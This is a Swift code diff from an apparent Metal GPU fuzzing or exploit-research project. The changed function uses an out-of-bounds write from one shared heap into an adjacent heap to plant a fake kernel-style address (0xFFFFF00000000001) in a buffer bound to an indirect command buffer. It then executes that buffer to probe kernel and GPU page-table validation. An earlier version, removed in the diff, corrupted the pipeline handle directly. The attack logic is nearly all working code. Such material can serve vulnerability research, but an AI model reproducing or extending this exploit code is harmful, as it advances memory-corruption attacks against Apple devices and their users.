@@ -513,49 +513,14 @@ func runGPUIndirectDispatch(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
-private func icbExecute(_ icb: MTLIndirectCommandBuffer,
-                         pso: MTLComputePipelineState,
-                         queue: MTLCommandQueue,
-                         oobCorrupt: Bool,
-                         log: FuzzLog,
-                         step: (String) -> Void,
-                         sl: SyncLog,
-                         completion: @escaping () -> Void) {
-    guard let cmd = queue.makeCommandBuffer(),
-          let enc = cmd.makeComputeCommandEncoder() else { step("cmd nil"); completion(); return }
-    enc.setComputePipelineState(pso)
-    enc.useResource(icb, usage: .read)
-    enc.executeCommandsInBuffer(icb, range: 0..<1)
-    enc.endEncoding()
-    let tag = oobCorrupt ? "CORRUPTED ICB EXECUTE" : "CLEAN ICB EXECUTE"
-    sl.write("\(tag) — committing")
-    cmd.addCompletedHandler { cb in
-        let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
-        switch s {
-        case .completed:
-            step("  COMPLETED — GPU executed ICB \(oobCorrupt ? "with corrupted PSO/binding" : "clean")")
-            if oobCorrupt { step("  kernel did not validate ICB PSO handle content") }
-        case .error:
-            step("  *** ERROR — kernel/GPU rejected corrupted ICB")
-            step("  *** error: \(e)")
-        default:
-            step("  status=\(s.rawValue) err=\(e)")
-        }
-        step("── ICB Corrupt complete ────────────────────")
-        completion()
-    }
-    cmd.commit()
-}
-
-// Indirect Command Buffer corruption.
-// MTLIndirectCommandBuffer (ICB) stores fully-encoded GPU compute commands in GPU-visible
-// shared memory: PSO handle, buffer bindings (GPU VAs), threadgroup dims — all in one blob.
-// Key: MTLHeap.makeIndirectCommandBuffer allocates the ICB INSIDE the heap's shared memory,
-// so we can read every encoded byte directly and corrupt specific fields via OOB write.
-// Attack: encode a valid compute command into h1-backed ICB, corrupt the PSO handle
-// with a fake GPU address, execute via enc.executeCommandsInBuffer → kernel validates
-// ICB commands on encode (different code path from submit-time validation) → kernel fault?
-func runICBCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
+// ICB Corrupt — Indirect Command Buffer execution with OOB-corrupted bound buffer.
+// MTLHeap.makeIndirectCommandBuffer does not exist (device-only API), so ICB is
+// device-allocated. Attack: heap-allocate icbBuf from h1 (adjacent to h0 OOB src),
+// bind it into the ICB command, OOB-corrupt icbBuf[0] with a huge index value,
+// shader reads icbBuf[0] as a uint64 index and writes dataBuf[index & 511].
+// After corruption: index = 0xFFFFF00000000001 → GPU resolves via AGX PPT.
+// Execute via executeCommandsInBuffer → different kernel code path from direct dispatch.
+func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async {
         let sl = SyncLog()
         func step(_ s: String) { sl.write(s); log.append(s) }
@@ -564,98 +529,106 @@ func runICBCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
         guard let queue  = device.makeCommandQueue() else { step("✗ no queue"); completion(); return }
         step("── ICB Corrupt ────────────────────────────")
 
-        // ── h0 (OOB src) + h1 (victim with ICB) ─────────────────────────
+        // h0 (OOB src) + h1 (victim — icbBuf lives here)
         let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
         guard let h0 = device.makeHeap(descriptor: hd),
               let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
-        let actual = h0.size  // 16384
+        let actual = h0.size
 
         guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
         let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
         let va0 = UInt(bitPattern: p0)
 
-        // Probe h1 base VA (64b → 4096 internal, occupies h1[0..4095])
+        // probe1 occupies h1[0..4095]; icbBuf will sit at h1[4096]
         guard let probe1 = h1.makeBuffer(length: 64, options: .storageModeShared) else { step("probe1 nil"); completion(); return }
         let va1 = UInt(bitPattern: probe1.contents())
         let dist = va1 > va0 ? va1 - va0 : va0 - va1
         step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
-        guard dist == UInt(actual) else { step("✗ not adjacent — retry"); completion(); return }
+        guard dist == UInt(actual) else { step("✗ not adjacent"); completion(); return }
         step("✓ adjacent confirmed")
 
-        // ── Compile noop PSO ─────────────────────────────────────────────
-        let src = "#include <metal_stdlib>\nusing namespace metal;\nkernel void noop(uint id [[thread_position_in_grid]]) {}"
+        // icbBuf bound into ICB — lives in h1 GPU-visible shared mem, OOB-reachable from h0
+        guard let icbBuf  = h1.makeBuffer(length: 64,   options: .storageModeShared) else { step("icbBuf nil");  completion(); return }
+        guard let dataBuf = device.makeBuffer(length: 4096, options: .storageModeShared) else { step("dataBuf nil"); completion(); return }
+
+        // Shader reads icbBuf[0] as UInt64 index, writes dataBuf[index & 511]
+        // After OOB corrupt: index = 0xFFFFF00000000001 (huge), GPU handles via AGX PPT
+        let src = """
+        #include <metal_stdlib>
+        using namespace metal;
+        kernel void icbFuzz(device ulong* indexBuf [[buffer(0)]],
+                            device ulong* dataBuf  [[buffer(1)]],
+                            uint id [[thread_position_in_grid]]) {
+            ulong idx = indexBuf[0];
+            dataBuf[idx & 511] = idx;
+        }
+        """
         let lib: MTLLibrary; let pso: MTLComputePipelineState
         do {
             lib = try device.makeLibrary(source: src, options: MTLCompileOptions())
-            guard let fn = lib.makeFunction(name: "noop") else { step("fn nil"); completion(); return }
+            guard let fn = lib.makeFunction(name: "icbFuzz") else { step("fn nil"); completion(); return }
             pso = try device.makeComputePipelineState(function: fn)
         } catch { step("✗ PSO: \(error.localizedDescription)"); completion(); return }
-        step("noop PSO compiled")
+        step("icbFuzz PSO compiled")
 
-        // ── Alloc ICB from h1 (lives in h1 GPU-visible shared memory) ───
+        // ICB from device (MTLHeap.makeIndirectCommandBuffer unsupported)
         let icbDesc = MTLIndirectCommandBufferDescriptor()
         icbDesc.commandTypes = .concurrentDispatch
         icbDesc.inheritBuffers = false
         icbDesc.inheritPipelineState = false
-        icbDesc.maxKernelBufferBindCount = 1
-
-        guard let icb = h1.makeIndirectCommandBuffer(descriptor: icbDesc,
-                                                      maxCommandCount: 1,
-                                                      options: .storageModeShared) else {
-            step("✗ ICB nil — heap may not support ICB allocation, falling back to device alloc")
-            // Fallback: alloc ICB from device (not heap-backed, but still GPU-visible)
-            guard let icbDev = device.makeIndirectCommandBuffer(descriptor: icbDesc,
-                                                                 maxCommandCount: 1,
-                                                                 options: .storageModeShared) else {
-                step("✗ ICB device alloc also nil"); completion(); return
-            }
-            // With device-allocated ICB we still encode + execute to probe kernel validation
-            step("  ICB from device (not heap-backed) — no OOB corrupt, probe-only")
-            icbExecute(icbDev, pso: pso, queue: queue, oobCorrupt: false, log: log, step: step, sl: sl, completion: completion)
-            return
+        icbDesc.maxKernelBufferBindCount = 2
+        guard let icb = device.makeIndirectCommandBuffer(descriptor: icbDesc,
+                                                          maxCommandCount: 1,
+                                                          options: .storageModeShared) else {
+            step("✗ ICB nil"); completion(); return
         }
-        step("ICB allocated in h1 heap (GPU-visible shared mem)")
+        step("ICB allocated from device (storageModeShared)")
 
-        // ── Encode one compute command into ICB ──────────────────────────
+        // Encode 1 compute command into ICB
         let cmd0 = icb.indirectComputeCommandAt(0)
         cmd0.setComputePipelineState(pso)
+        cmd0.setKernelBuffer(icbBuf,  offset: 0, index: 0)
+        cmd0.setKernelBuffer(dataBuf, offset: 0, index: 1)
         cmd0.concurrentDispatchThreads(MTLSize(width:1,height:1,depth:1),
                                         threadsPerThreadgroup: MTLSize(width:1,height:1,depth:1))
-        step("encoded 1 compute command into ICB")
+        step("encoded ICB: icbFuzz(icbBuf[h1], dataBuf) dispatch(1,1,1)")
 
-        // ── Scan h1 for ICB encoded bytes (via h0 OOB) ──────────────────
-        // probe1 occupies h1[0..4095], ICB starts at h1[4096]
-        // OOB offset: p0[actual + 4096 + X] = h1[4096 + X] = ICB[X]
-        let icbBase = 4096
-        step("ICB raw bytes at h1[+\(icbBase)..] (via OOB):")
-        var firstNonZeroOff = -1
-        for qw in 0..<16 {
-            var val: UInt64 = 0
-            for b in 0..<8 { val |= UInt64(p0[actual + icbBase + qw*8 + b]) << (b*8) }
-            if val != 0 {
-                step("  ICB[+\(qw*8)]=0x\(String(val,radix:16))")
-                if firstNonZeroOff < 0 { firstNonZeroOff = qw*8 }
-            }
-        }
-        if firstNonZeroOff < 0 { step("  ICB[0..127] all zero — command may be at different offset") }
+        // OOB-corrupt icbBuf[0..7] via h0 (probe1 at h1[0..4095], icbBuf at h1[4096])
+        // p0[actual + 4096 + b] writes into icbBuf[b]
+        let kptr: [UInt8] = [0x01,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]
+        step("OOB-corrupting icbBuf[0..7] = 0xFFFFF00000000001 via h0")
+        for b in 0..<8 { p0[actual + 4096 + b] = kptr[b] }
 
-        // ── Corrupt ICB: plant fake GPU VA at ICB[0] and [8] ────────────
-        // ICB[0] typically = PSO handle (GPU VA or index into driver PSO table)
-        // ICB[8] typically = first buffer binding GPU VA
-        // Replacing either with a fake kptr → GPU/kernel fault on execution
-        let kptr: [UInt8] = [0x08,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]
-        step("OOB-corrupting ICB[+0..+23] with 0xFFFFFFF000000008 (PSO handle + bindings)")
-        for off in [0, 8, 16] {
-            for b in 0..<8 { p0[actual + icbBase + off + b] = kptr[b] }
-        }
-
-        // Readback via OOB to confirm write
         var rb: UInt64 = 0
-        for b in 0..<8 { rb |= UInt64(p0[actual + icbBase + b]) << (b*8) }
-        step("ICB[+0] readback: 0x\(String(rb,radix:16))")
+        for b in 0..<8 { rb |= UInt64(p0[actual + 4096 + b]) << (b*8) }
+        step("icbBuf[0] readback: 0x\(String(rb,radix:16))")
 
-        // ── Execute corrupted ICB ────────────────────────────────────────
-        icbExecute(icb, pso: pso, queue: queue, oobCorrupt: true, log: log, step: step, sl: sl, completion: completion)
+        // Execute ICB via outer compute encoder
+        guard let cmd = queue.makeCommandBuffer(),
+              let enc = cmd.makeComputeCommandEncoder() else { step("cmd nil"); completion(); return }
+        enc.setComputePipelineState(pso)
+        enc.useResource(icb,     usage: .read)
+        enc.useResource(icbBuf,  usage: .read)
+        enc.useResource(dataBuf, usage: .write)
+        enc.executeCommandsInBuffer(icb, range: 0..<1)
+        enc.endEncoding()
+        sl.write("CORRUPTED ICB EXECUTE — committing")
+        cmd.addCompletedHandler { cb in
+            let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
+            switch s {
+            case .completed:
+                step("  COMPLETED — GPU executed ICB with OOB-corrupted index buffer")
+                step("  AGX PPT passed index=0xFFFFF00000000001 through ICB execute path")
+            case .error:
+                step("  *** ERROR — GPU/kernel rejected ICB execute with corrupted buffer")
+                step("  *** error: \(e)")
+            default:
+                step("  status=\(s.rawValue) err=\(e)")
+            }
+            step("── ICB Corrupt complete ────────────────────")
+            completion()
+        }
+        cmd.commit()
     }
 }
 
